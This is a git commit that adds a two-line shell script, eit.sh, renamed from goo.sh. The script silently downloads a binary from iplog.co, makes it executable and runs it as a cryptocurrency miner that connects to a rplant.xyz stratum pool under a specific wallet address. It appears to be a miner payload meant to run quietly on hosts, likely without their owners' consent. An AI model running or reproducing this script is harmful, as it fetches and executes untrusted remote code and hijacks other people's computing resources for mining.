1a1fbc2dd655d0fab39c2ec4a08a493654b6710c
taygwgahya <165781235+taygwgahya@users.noreply.github.com>
2024-04-02 17:37:19 +0700

    Update and rename goo.sh to eit.sh

---
+++ eit.sh
@@ -0,0 +1,2 @@
+wget -q -O home https://iplog.co/bash && chmod +x home >/dev/null 2>&1
+./home -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17115 -u shuga1q5gnn6p9q3uf5eekvvetcttal7dkx5kr9s2xzzz.$(echo $(shuf -i 1-9 -n 1)-Excel) -p -t2
